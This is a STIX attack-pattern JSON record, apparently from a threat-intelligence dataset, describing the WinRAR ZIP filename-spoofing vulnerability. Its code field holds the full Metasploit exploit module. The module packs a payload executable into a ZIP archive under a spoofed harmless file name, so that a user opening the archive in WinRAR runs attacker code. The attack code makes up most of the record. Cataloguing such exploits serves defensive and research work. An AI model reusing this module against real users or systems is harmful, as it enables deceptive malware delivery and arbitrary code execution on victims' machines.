{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--132af171-aeb6-463a-9c93-14c735360185",
    "created": "2024-08-14T16:35:58.952976Z",
    "modified": "2024-08-14T16:35:58.952979Z",
    "name": "WinRAR Filename Spoofing",
    "description": " This module abuses a filename spoofing vulnerability in WinRAR. The vulnerability exists when opening ZIP files. The file names showed in WinRAR when opening a ZIP file come from the central directory, but the file names used to extract and open contents come from the Local File Header. This inconsistency allows to spoof file names when opening ZIP files with WinRAR, which can be abused to execute arbitrary code, as exploited in the wild in March 2014  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/winrar_name_spoofing.rb",
            "external_id": "winrar_name_spoofing.rb"
        },
        {
            "source_name": "reference",
            "url": "http://securityaffairs.co/wordpress/23623/hacking/winrar-zero-day.html"
        },
        {
            "source_name": "reference",
            "url": "http://an7isec.blogspot.co.il/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WinRAR Filename Spoofing',\n      'Description'    => %q{\n        This module abuses a filename spoofing vulnerability in WinRAR. The vulnerability exists\n        when opening ZIP files. The file names showed in WinRAR when opening a ZIP file come from\n        the central directory, but the file names used to extract and open contents come from the\n        Local File Header. This inconsistency allows to spoof file names when opening ZIP files\n        with WinRAR, which can be abused to execute arbitrary code, as exploited in the wild in\n        March 2014\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'chr1x', # Vulnerability discoverer according to OSVDB\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '62610' ],\n          [ 'BID', '66383' ],\n          [ 'URL', 'http://securityaffairs.co/wordpress/23623/hacking/winrar-zero-day.html'],\n          [ 'URL', 'http://an7isec.blogspot.co.il/']\n        ],\n      'Platform'          => [ 'win' ],\n      'Payload'           =>\n        {\n          'DisableNops' => true,\n          'Space' => 4096\n        },\n      'Targets'        =>\n        [\n          [ 'Windows Universal', {} ]\n        ],\n      'DisclosureDate' => '2009-09-28',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('SPOOF', [ true, 'The spoofed file name to show', 'Readme.txt']),\n        OptString.new('FILENAME', [ true, 'The output file name.', 'msf.zip'])\n      ])\n\n  end\n\n  def exploit\n    exe_filename = rand_text_alpha(rand(6) + 1)\n    exe_filename << \".exe\"\n\n    zip = Rex::Zip::Archive.new\n    zip.add_file(exe_filename, generate_payload_exe, nil, nil, datastore['SPOOF'])\n    pack = zip.pack\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n    file_create(pack)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-09-28",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}